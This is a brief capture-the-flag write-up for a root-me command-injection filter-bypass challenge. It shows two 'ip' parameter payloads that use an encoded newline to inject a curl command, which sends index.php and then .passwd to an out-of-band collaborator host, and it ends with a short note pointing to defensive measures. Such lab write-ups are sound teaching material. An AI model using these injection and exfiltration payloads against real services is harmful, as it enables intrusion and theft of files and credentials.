# Command injection: filter bypass

[root-me challenge: Command injection - Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass): Find a vulnerability in this service and exploit it. Some protections were added. The flag is in the `index.php` file.

----

Either use Burp Collaborator or one of its alternatives:

```text
ip=127.0.0.1+%0A+curl+--data+"@index.php"+jobc0c724o9snp1oq21rh50ex53wrnfc.oastify.com
```

leading to:

```text
ip=127.0.0.1+%0A+curl+-X+POST+--data+"@.passwd"+jobc0c724o9snp1oq21rh50ex53wrnfc.oastify.com
```

## Counter moves

Command injection: filter bypass is what this page works through. Server-side validation and least privilege are what these reduce to. The defender's view is in the blue notes on [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
